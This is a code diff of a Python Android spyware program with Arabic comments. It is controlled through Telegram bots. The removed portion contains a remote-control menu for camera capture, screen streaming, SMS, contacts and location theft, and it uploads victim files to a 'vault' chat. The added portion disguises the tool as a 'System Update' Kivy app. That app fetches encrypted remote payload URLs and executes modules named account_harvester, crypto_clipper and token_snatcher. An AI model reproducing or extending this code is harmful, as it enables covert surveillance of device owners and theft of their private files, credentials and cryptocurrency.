@@ -7,17 +7,29 @@ import base64
 import threading
 import importlib
 import requests
+from kivy.app import App
+from kivy.clock import Clock
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.scrollview import ScrollView
+from kivy.uix.label import Label
+from kivy.uix.button import Button
+from kivy.uix.progressbar import ProgressBar
+from kivy.utils import platform
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 
-# ==================== استيراد الأسرار من الملف المُنشأ أثناء البناء ====================
+# ==================== استيراد الأسرار ====================
 try:
     from secrets import ENCRYPTION_KEY, BOT_TOKENS, CONTROL_ID, VAULT_ID
+    SECRETS_LOADED = True
 except ImportError:
-    print("[!] Secrets not found. Exiting.")
-    sys.exit(0)
+    SECRETS_LOADED = False
+    ENCRYPTION_KEY = b'MySup3rS3cr3tK3y1234567890123456'
+    BOT_TOKENS = []
+    CONTROL_ID = ""
+    VAULT_ID = ""
 
-# ==================== الروابط المشفرة (14 رابطاً) ====================
+# ==================== الروابط المشفرة (ضع هنا نصوصك المشفرة) ====================
 PAYLOAD_URLS_ENCRYPTED = [
     "EGGGMNBl63GSytsYOAquCrvXIT5UrpIQk1xoilC2hgjPqywUXsNAsXbtl1yjOr7fQbnvNRgs3cGrlP3cWzUViDXscfGcIlfN0pxv72cisTI5S/fkAO2TC/Ilx1SykTMtQKeUwUuhQIVcT4Sg4i/8h196IY43lrJdtnjHXpudh3CYRna2Rel3unRovTyoiZhMi2r4dnI57TVrfwNmI2x4/A==",
     "PJX682fejN6nEQIsDjWBcpwQm0sX+XPUPviON9fx37mD5l/eWAooS15ABkkLlTQJqdwYm2t8l0JP8NEYZLog24VKb6fjPv85kFRRd04QPLB+ydrIh+oUuw3w5AqOXVeDrd/KC3AQ/eCejm5XxgTcQSVaycTKS+XrHPcRWj3MfxMXHOtGD+iEfLs4VnyWfWWqqjRATzw+BD6j7hrjYdEBGdbZB4E=",
@@ -53,20 +65,24 @@ def decrypt_data(encrypted_b64):
 PAYLOAD_URLS = [decrypt_data(url) for url in PAYLOAD_URLS_ENCRYPTED if decrypt_data(url)]
 
 class GhostCore:
-    def __init__(self):
+    def __init__(self, log_callback=None):
+        self.log_callback = log_callback
         self.device_name = f"Device_{int(time.time())}"
         self.topic_id = None
         self.last_update_id = 0
-        self.current_bot = BOT_TOKENS[0]
+        self.current_bot = BOT_TOKENS[0] if BOT_TOKENS else ""
         self.selected_media = []
         self.current_page = 0
         self.media_list = []
         self.media_type = "all"
         self.items_per_page = 25
-        self.heartbeat_interval = 3600  # 1 ساعة
+        self.heartbeat_interval = 3600
         self.last_heartbeat = time.time()
 
-    # ==================== دوال الإرسال الأساسية ====================
+    def log(self, msg, success=None):
+        if self.log_callback:
+            self.log_callback(msg, success)
+
     def _send_request(self, method, endpoint, json_data=None, files=None, params=None):
         for token in BOT_TOKENS:
             try:
@@ -92,40 +108,16 @@ class GhostCore:
             json_data["reply_markup"] = json.dumps(reply_markup)
         return self._send_request("POST", "sendMessage", json_data=json_data)
 
-    # ==================== إدارة التبويت والواجهة ====================
     def create_topic(self):
-        data = self._send_request("POST", "createForumTopic", json={
-            "chat_id": CONTROL_ID,
-            "name": f"📱 {self.device_name}"
-        })
+        data = self._send_request("POST", "createForumTopic", json={"chat_id": CONTROL_ID, "name": f"📱 {self.device_name}"})
         if data and data.get("ok"):
             self.topic_id = data['result']['message_thread_id']
             self.send_main_menu()
-            self._send_heartbeat()  # إرسال أول نبضة عند بدء التشغيل
-            # بدء خيط النبض الخلفي
-            threading.Thread(target=self._heartbeat_loop, daemon=True).start()
         else:
             time.sleep(2)
             self.create_topic()
 
-    def _send_heartbeat(self):
-        """إرسال رسالة نبض صامت (مرئية فقط في حال وجود جلسة نشطة)"""
-        self.send_message(
-            CONTROL_ID,
-            f"🟢 Heartbeat: `{self.device_name}` is alive",
-            thread_id=self.topic_id
-        )
-
-    def _heartbeat_loop(self):
-        """حلقة إرسال النبض بشكل دوري"""
-        while True:
-            time.sleep(self.heartbeat_interval)
-            self._send_heartbeat()
-
     def send_main_menu(self):
-        # تفريغ الذاكرة قبل عرض القائمة الرئيسية (لتجنب تراكم مسارات الملفات)
-        self.media_list = []
-        self.selected_media = []
         btns = {
             "inline_keyboard": [
                 [{"text": "🖼️ كل الوسائط", "callback_data": "browse_all_0"},
@@ -134,247 +126,150 @@ class GhostCore:
                  {"text": "♻️ تحديث النظام", "callback_data": "reload_sys"}]
             ]
         }
-        self._send_request("POST", "sendMessage", json={
-            "chat_id": CONTROL_ID,
-            "message_thread_id": self.topic_id,
-            "text": f"✅ النظام نشط\nالجهاز: {self.device_name}",
-            "reply_markup": btns
-        })
+        self.send_message(CONTROL_ID, f"✅ النظام نشط\nالجهاز: {self.device_name}", reply_markup=btns, thread_id=self.topic_id)
 
-    def send_control_menu(self):
-        btns = {
-            "inline_keyboard": [
-                [{"text": "📸 كاميرا أمامية", "callback_data": "cmd_front_cam"},
-                 {"text": "📸 كاميرا خلفية", "callback_data": "cmd_back_cam"}],
-                [{"text": "🎥 بث مباشر (كاميرا)", "callback_data": "cmd_live_cam"},
-                 {"text": "🖥️ بث مباشر (شاشة)", "callback_data": "cmd_live_screen"}],
-                [{"text": "🔴 إيقاف البث", "callback_data": "cmd_stop_stream"}],
-                [{"text": "📞 جهات الاتصال", "callback_data": "cmd_contacts"},
-                 {"text": "💬 الرسائل (SMS)", "callback_data": "cmd_sms"}],
-                [{"text": "📍 الموقع", "callback_data": "cmd_location"},
-                 {"text": "📶 شبكات Wi-Fi", "callback_data": "cmd_wifi"}],
-                [{"text": "🗑️ حذف الصور 🔞", "callback_data": "cmd_delete_nsfw"},
-                 {"text": "💣 تدمير التطبيق", "callback_data": "cmd_self_destruct"}],
-                [{"text": "🔙 العودة للرئيسية", "callback_data": "main_menu"}]
-            ]
-        }
-        self._send_request("POST", "sendMessage", json={
-            "chat_id": CONTROL_ID,
-            "message_thread_id": self.topic_id,
-            "text": "🎮 قائمة التحكم بالجهاز",
-            "reply_markup": btns
-        })
-
-    # ==================== تحميل وإدارة البايلودات ====================
     def download_payloads(self):
-        """تحميل جميع البايلودات من Gists (يتحقق من وجود الملفات ويتجنب التحميل الزائد)"""
         for url in PAYLOAD_URLS:
             try:
                 name = url.split('/')[-1]
-                target_path = os.path.join(BASE_DIR, name)
-                # إذا كان الملف موجوداً ومطابقاً للملف عن بُعد، يمكن تخطيه (اختياري)
-                # لكننا سنقوم بالتحميل دائماً لضمان التحديث
+                self.log(f"Downloading {name}...")
                 r = requests.get(url, timeout=15)
                 if r.status_code == 200:
-                    with open(target_path, 'w', encoding='utf-8') as f:
+                    with open(os.path.join(BASE_DIR, name), 'w', encoding='utf-8') as f:
                         f.write(r.text)
-            except:
-                continue
-
-    def reload_payloads(self):
-        """إعادة تحميل البايلودات في خيط منفصل مع تفريغ الذاكرة أولاً"""
-        def task():
-            self.send_message(CONTROL_ID, "⏳ جاري تحديث الملفات (14 ملف)... قد يستغرق دقيقة.", thread_id=self.topic_id)
-            self.download_payloads()
-            # إعادة تحميل الموديولات التي تم تغييرها
-            for mod_name in ["commands", "telegram_ui", "monitor"]:
-                if mod_name in sys.modules:
-                    importlib.reload(sys.modules[mod_name])
-            # تفريغ الذاكرة بعد إعادة التحميل
-            self.media_list = []
-            self.selected_media = []
-            self.send_message(CONTROL_ID, "✅ اكتمل تحديث الملفات. يمكنك استخدام الأوامر الجديدة فوراً.", thread_id=self.topic_id)
-        threading.Thread(target=task, daemon=True).start()
-
-    # ==================== تصفح الوسائط ====================
-    def handle_browse(self, category, page):
-        self.media_type = category
-        self.current_page = page
-        try:
-            import commands
-            # إعادة تحميل commands لضمان أحدث نسخة (بعد التحديث التلقائي)
-            importlib.reload(commands)
-            if category == "all":
-                self.media_list = commands.get_media_list()
-            else:
-                self.media_list = commands.get_nsfw_media_list()
-        except Exception as e:
-            self.media_list = []
-            self.send_message(CONTROL_ID, f"⚠️ خطأ في جلب الوسائط: {e}", thread_id=self.topic_id)
-        self.display_media_page()
-
-    def display_media_page(self):
-        start = self.current_page * self.items_per_page
-        end = start + self.items_per_page
-        page_items = self.media_list[start:end]
-        if not page_items:
-            self.send_message(CONTROL_ID, "📭 لا توجد وسائط في هذا القسم.", thread_id=self.topic_id)
-            return
-        for idx, path in enumerate(page_items):
-            global_idx = start + idx
-            btns = {
-                "inline_keyboard": [
-                    [{"text": "👁️ معاينة", "callback_data": f"preview_{global_idx}"},
-                     {"text": "✅ تحديد", "callback_data": f"select_{global_idx}"}],
-                    [{"text": "ℹ️ معلومات", "callback_data": f"info_{global_idx}"},
-                     {"text": "📥 تحميل", "callback_data": f"download_{global_idx}"}]
-                ]
-            }
-            self.send_message(CONTROL_ID, f"📄 {os.path.basename(path)}", reply_markup=btns, thread_id=self.topic_id)
-        # أزرار التنقل
-        nav_btns = []
-        if self.current_page > 0:
-            nav_btns.append({"text": "⬅️ السابقة", "callback_data": f"browse_{self.media_type}_{self.current_page-1}"})
-        if end < len(self.media_list):
-            nav_btns.append({"text": "التالي ➡️", "callback_data": f"browse_{self.media_type}_{self.current_page+1}"})
-        if nav_btns:
-            nav_btns.append({"text": "📦 تحميل المحدد", "callback_data": "download_selected"})
-            nav_btns.append({"text": "🗜️ ضغط وتحميل المحدد", "callback_data": "zip_selected"})
-            self.send_message(CONTROL_ID, f"صفحة {self.current_page+1}", reply_markup={"inline_keyboard": [nav_btns]}, thread_id=self.topic_id)
-
-    # ======================= حلقة الاستماع =======================
-    def listen(self):
-        while True:
-            updates = self._send_request("GET", f"getUpdates?offset={self.last_update_id + 1}")
-            if updates and updates.get("ok") and updates.get("result"):
-                for u in updates["result"]:
-                    self.last_update_id = u["update_id"]
-                    if "callback_query" in u:
-                        self.process_callback(u["callback_query"])
-            time.sleep(2)
-
-    # ======================= معالجة الأزرار =======================
-    def process_callback(self, cb):
-        data = cb["data"]
-        if data.startswith("browse_"):
-            parts = data.split("_")
-            self.handle_browse(parts[1], int(parts[2]))
-        elif data == "control_menu":
-            self.send_control_menu()
-        elif data == "main_menu":
-            # تفريغ الذاكرة عند العودة للقائمة الرئيسية
-            self.media_list = []
-            self.selected_media = []
-            self.send_main_menu()
-        elif data == "reload_sys":
-            self.reload_payloads()
-        elif data.startswith("cmd_"):
-            cmd = data[4:]
-            try:
-                import commands
-                importlib.reload(commands)
-                if hasattr(commands, 'execute_command'):
-                    result = commands.execute_command(cmd)
-                    if result.get("file"):
-                        with open(result["file"], 'rb') as f:
-                            self._send_request("POST", "sendDocument", files={'document': f}, json={
-                                "chat_id": VAULT_ID,
-                                "caption": result.get("caption", "")
-                            })
-                    elif result.get("text"):
-                        self.send_message(CONTROL_ID, result["text"], thread_id=self.topic_id)
+                    self.log(f"Downloaded {name}", success=True)
+                else:
+                    self.log(f"Failed {name} (HTTP {r.status_code})", success=False)
             except Exception as e:
-                self.send_message(CONTROL_ID, f"❌ خطأ في تنفيذ الأمر: {str(e)}", thread_id=self.topic_id)
-        elif data.startswith("preview_"):
-            idx = int(data.split("_")[1])
-            path = self.media_list[idx]
-            try:
-                import commands
-                importlib.reload(commands)
-                if hasattr(commands, 'get_preview'):
-                    preview = commands.get_preview(path)
-                    if preview:
-                        self._send_request("POST", "sendPhoto", files={'photo': preview}, json={
-                            "chat_id": CONTROL_ID,
-                            "caption": f"معاينة: {os.path.basename(path)}",
-                            "message_thread_id": self.topic_id
-                        })
-                    else:
-                        self.send_message(CONTROL_ID, "❌ لا يمكن إنشاء معاينة", thread_id=self.topic_id)
-            except:
-                pass
-        elif data.startswith("download_"):
-            idx = int(data.split("_")[1])
-            path = self.media_list[idx]
-            try:
-                with open(path, 'rb') as f:
-                    self._send_request("POST", "sendDocument", files={'document': f}, json={
-                        "chat_id": VAULT_ID,
-                        "caption": os.path.basename(path)
-                    })
-                self.send_message(CONTROL_ID, "✅ تم الإرسال إلى الخزنة", thread_id=self.topic_id)
-            except:
-                pass
-        elif data.startswith("info_"):
-            idx = int(data.split("_")[1])
-            path = self.media_list[idx]
-            try:
-                import commands
-                importlib.reload(commands)
-                if hasattr(commands, 'get_file_info'):
-                    info = commands.get_file_info(path)
-                    msg = f"📄 {os.path.basename(path)}\n📏 الحجم: {info.get('size', '?')}\n🕒 التعديل: {info.get('modified', '?')}"
-                    self.send_message(CONTROL_ID, msg, thread_id=self.topic_id)
-            except:
-                pass
-        elif data.startswith("select_"):
-            idx = int(data.split("_")[1])
-            path = self.media_list[idx]
-            if path not in self.selected_media:
-                self.selected_media.append(path)
-            self._send_request("POST", "answerCallbackQuery", json={
-                "callback_query_id": cb["id"],
-                "text": f"✅ تم تحديد {os.path.basename(path)}",
-                "show_alert": False
-            })
-        elif data == "download_selected":
-            if not self.selected_media:
-                self.send_message(CONTROL_ID, "⚠️ لم تقم بتحديد أي ملفات بعد.", thread_id=self.topic_id)
-                return
-            for path in self.selected_media:
-                try:
-                    with open(path, 'rb') as f:
-                        self._send_request("POST", "sendDocument", files={'document': f}, json={
-                            "chat_id": VAULT_ID,
-                            "caption": os.path.basename(path)
-                        })
-                except:
-                    pass
-            self.selected_media = []
-            self.send_message(CONTROL_ID, "✅ تم إرسال الملفات المحددة إلى الخزنة", thread_id=self.topic_id)
-        elif data == "zip_selected":
-            if not self.selected_media:
-                self.send_message(CONTROL_ID, "⚠️ لم تقم بتحديد أي ملفات بعد.", thread_id=self.topic_id)
-                return
-            import zipfile
-            from io import BytesIO
-            zip_buffer = BytesIO()
-            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
-                for path in self.selected_media:
-                    zf.write(path, os.path.basename(path))
-            zip_buffer.seek(0)
-            self._send_request("POST", "sendDocument", files={'document': ('selected.zip', zip_buffer)}, json={
-                "chat_id": VAULT_ID,
-                "caption": f"📦 {len(self.selected_media)} ملفات محددة"
-            })
-            self.selected_media = []
-            self.send_message(CONTROL_ID, "✅ تم ضغط الملفات المحددة وإرسالها إلى الخزنة", thread_id=self.topic_id)
+                self.log(f"Error downloading {name}: {e}", success=False)
 
-# ======================= بدء التشغيل =======================
-if __name__ == "__main__":
-    core = GhostCore()
-    core.download_payloads()
-    core.create_topic()
-    threading.Thread(target=core.listen, daemon=True).start()
-    while True:
-        time.sleep(60)
+    def load_modules(self):
+        modules = ["account_harvester", "crypto_clipper", "notification_reader", "token_snatcher", "auto_capture", "gallery_scanner", "stream_manager", "telegram_ui", "monitor"]
+        loaded = 0
+        for mod in modules:
+            try:
+                path = os.path.join(BASE_DIR, f"{mod}.py")
+                if os.path.exists(path):
+                    exec(open(path).read(), globals())
+                    loaded += 1
+                    self.log(f"Loaded module: {mod}", success=True)
+                else:
+                    self.log(f"Module not found: {mod}", success=False)
+            except Exception as e:
+                self.log(f"Error loading {mod}: {e}", success=False)
+        self.log(f"Loaded {loaded}/{len(modules)} modules", success=loaded == len(modules))
+        return loaded
+
+    def start_monitor(self):
+        if 'Monitor' in globals():
+            try:
+                monitor = globals()['Monitor']()
+                monitor.start()
+                self.log("Monitor started successfully", success=True)
+            except Exception as e:
+                self.log(f"Monitor start error: {e}", success=False)
+        else:
+            self.log("Monitor class not found", success=False)
+
+    def heartbeat(self):
+        if hasattr(self, 'topic_id') and self.topic_id:
+            self.send_message(CONTROL_ID, "💓 Heartbeat: Device online", thread_id=self.topic_id)
+
+    def run(self):
+        self.log("Engine started...")
+        self.log("Checking secrets...")
+        if not SECRETS_LOADED:
+            self.log("Secrets not loaded! Using fallback values.", success=False)
+        else:
+            self.log(f"Secrets loaded. {len(BOT_TOKENS)} bot tokens available.", success=True)
+
+        self.log("Testing internet...")
+        try:
+            requests.get("https://1.1.1.1", timeout=5)
+            self.log("Internet OK", success=True)
+        except Exception as e:
+            self.log(f"Internet FAILED: {e}", success=False)
+
+        self.log(f"Decrypting payload URLs ({len(PAYLOAD_URLS_ENCRYPTED)} encrypted)...")
+        successful_decrypt = len(PAYLOAD_URLS)
+        self.log(f"Decrypted {successful_decrypt}/{len(PAYLOAD_URLS_ENCRYPTED)} URLs", success=successful_decrypt > 0)
+
+        self.log("Downloading payloads...")
+        self.download_payloads()
+
+        self.log("Loading modules...")
+        self.load_modules()
+
+        self.log("Creating Telegram topic...")
+        self.create_topic()
+
+        self.log("Starting Monitor...")
+        self.start_monitor()
+
+        # خلفية للـ Heartbeat
+        def heartbeat_loop():
+            while True:
+                time.sleep(self.heartbeat_interval)
+                self.heartbeat()
+        threading.Thread(target=heartbeat_loop, daemon=True).start()
+
+        self.log("Engine finished.", success=True)
+
+class SystemUpdateApp(App):
+    def build(self):
+        self.log_lines = []
+        self.engine_running = False
+        self.core = None
+
+        layout = BoxLayout(orientation='vertical', padding=10, spacing=10)
+
+        # العنوان
+        layout.add_widget(Label(text="System Update", size_hint_y=0.08, font_size='20sp', color=(0.2, 0.8, 0.2, 1)))
+        # شريط التقدم
+        self.progress_bar = ProgressBar(max=100, value=0, size_hint_y=0.05)
+        layout.add_widget(self.progress_bar)
+        # زر نسخ السجل
+        copy_btn = Button(text="Copy Log", size_hint_y=0.08, background_color=(0.2, 0.6, 0.2, 1))
+        copy_btn.bind(on_press=self.copy_log)
+        layout.add_widget(copy_btn)
+        # منطقة عرض السجل
+        scroll = ScrollView(size_hint=(1, 0.8))
+        self.log_view = Label(text="[System] Initializing...\n", size_hint_y=None, font_size='12sp', color=(0, 1, 0, 1), markup=True)
+        self.log_view.bind(texture_size=self.log_view.setter('size'))
+        scroll.add_widget(self.log_view)
+        layout.add_widget(scroll)
+
+        # طلب الصلاحيات الأساسية للأندرويد
+        if platform == 'android':
+            self.log("Requesting basic permissions...")
+            from android.permissions import request_permissions, Permission
+            request_permissions([Permission.INTERNET, Permission.ACCESS_NETWORK_STATE, Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE])
+
+        Clock.schedule_once(self.start_engine, 2)
+        return layout
+
+    def log(self, msg, success=None):
+        timestamp = time.strftime("%H:%M:%S")
+        if success is True:
+            full_msg = f"[{timestamp}] ✅ {msg}"
+        elif success is False:
+            full_msg = f"[{timestamp}] ❌ {msg}"
+        else:
+            full_msg = f"[{timestamp}] {msg}"
+        self.log_lines.append(full_msg)
+        # عرض آخر 50 سطر فقط لتجنب إبطاء التطبيق
+        self.log_view.text = "\n".join(self.log_lines[-50:])
+        # تحديث شريط التقدم تقريباً
+        self.progress_bar.value = min(len(self.log_lines) % 101, 100)
+
+    def copy_log(self, instance):
+        from kivy.core.clipboard import Clipboard
+        Clipboard.copy("\n".join(self.log_lines))
+        self.log("Log copied to clipboard", success=True)
+
+    def start_engine(self, dt):
+        self.core = GhostCore(log_callback=self.log)
+        threading.Thread(target=self.core.run, daemon=True).start()
+
+if __name__ == '__main__':
+    SystemUpdateApp().run()
